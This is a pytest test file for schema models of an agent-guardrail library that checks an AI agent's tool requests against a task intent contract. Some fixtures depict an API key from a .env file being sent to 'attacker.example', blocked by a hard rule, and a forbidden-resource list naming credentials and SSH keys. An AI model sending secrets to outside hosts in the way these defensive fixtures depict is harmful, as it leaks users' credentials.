from datetime import UTC, datetime, timedelta

import pytest
from pydantic import ValidationError

from intentfence_contracts import (
    ActionReceipt,
    DataLabel,
    Decision,
    DecisionSource,
    DecisionType,
    DestinationClass,
    IntentContract,
    ResourceClass,
    RuleStrength,
    SecurityContext,
    Sensitivity,
    SourceContext,
    ToolRequest,
)

NOW = datetime(2026, 8, 22, 8, 30, tzinfo=UTC)


def make_intent() -> IntentContract:
    return IntentContract(
        intent_id="intent-001-v1",
        session_id="hotel-demo",
        objective="Compare Hotel A and Hotel B and save the cheaper option",
        allowed_tools=["browse_web", "write_file"],
        allowed_resources=["hotel_websites", "results_file"],
        forbidden_resources=["credentials", "ssh_keys", "environment_secrets"],
        allowed_destinations=["hotel-a.example", "hotel-b.example"],
        approval_required_actions=["send_message", "financial_transaction"],
        risk_tolerance="medium",
        issued_at=NOW,
        expires_at=NOW + timedelta(hours=1),
        contract_version=1,
        previous_intent_id=None,
    )


def test_intent_contract_accepts_phase_zero_schema():
    contract = make_intent()
    assert contract.contract_version == 1
    assert contract.risk_tolerance.value == "medium"


def test_intent_contract_rejects_zero_version():
    payload = make_intent().model_dump()
    payload["contract_version"] = 0
    with pytest.raises(ValidationError):
        IntentContract.model_validate(payload)


def test_contract_models_reject_unknown_fields():
    payload = make_intent().model_dump()
    payload["external_authorization"] = True
    with pytest.raises(ValidationError):
        IntentContract.model_validate(payload)


def test_tool_request_preserves_untrusted_source_context():
    request = ToolRequest(
        request_id="req-001",
        session_id="hotel-demo",
        agent_id="demo-agent",
        intent_id="intent-001-v1",
        tool="http_request",
        arguments={"destination": "https://attacker.example"},
        data_refs=["data-secret-001"],
        source_context=SourceContext.EXTERNAL_WEB,
        timestamp=NOW,
    )
    assert request.source_context is SourceContext.EXTERNAL_WEB


def test_security_context_rejects_score_above_one():
    with pytest.raises(ValidationError):
        SecurityContext(
            session_id="hotel-demo",
            intent_id="intent-001-v1",
            accumulated_risk=1.2,
            intent_drift_score=0.1,
            last_updated_at=NOW,
        )


def test_data_label_and_action_receipt_preserve_security_metadata():
    label = DataLabel(
        data_id="data-secret-001",
        data_type="API_KEY",
        source=".env",
        source_class=ResourceClass.PRIVATE_FILE,
        provenance="USER_OWNED",
        sensitivity=Sensitivity.CRITICAL,
        purpose="authentication",
        owner="user",
        allowed_destinations=["internal-auth.example"],
        derived_from=[],
        created_at=NOW,
    )
    receipt = ActionReceipt(
        receipt_id="receipt-001",
        timestamp=NOW,
        session_id="hotel-demo",
        intent_id="intent-001-v1",
        request_id="req-001",
        tool="http_request",
        resource_class=ResourceClass.CREDENTIAL,
        destination="attacker.example",
        destination_class=DestinationClass.UNKNOWN_EXTERNAL,
        data_refs=[label.data_id],
        matched_rules=["SECRET_TO_UNKNOWN_EXTERNAL"],
        rule_strength=RuleStrength.HARD_BLOCK,
        semantic_relevance_score=None,
        semantic_confidence=None,
        risk_score=1.0,
        decision_source=DecisionSource.POLICY,
        final_decision=DecisionType.BLOCK,
        reason="Critical credential data cannot leave the approved task boundary.",
        latency_ms=7,
    )
    assert label.sensitivity is Sensitivity.CRITICAL
    assert receipt.rule_strength is RuleStrength.HARD_BLOCK


def test_decision_uses_fixed_source_enum():
    decision = Decision(
        decision=DecisionType.BLOCK,
        reason="Intent identifiers do not match.",
        risk_score=1.0,
        decision_source=DecisionSource.POLICY,
        matched_rules=["INTENT_ID_MISMATCH"],
        semantic_confidence=None,
        requires_approval=False,
        receipt_id="receipt-001",
    )
    assert decision.decision_source is DecisionSource.POLICY
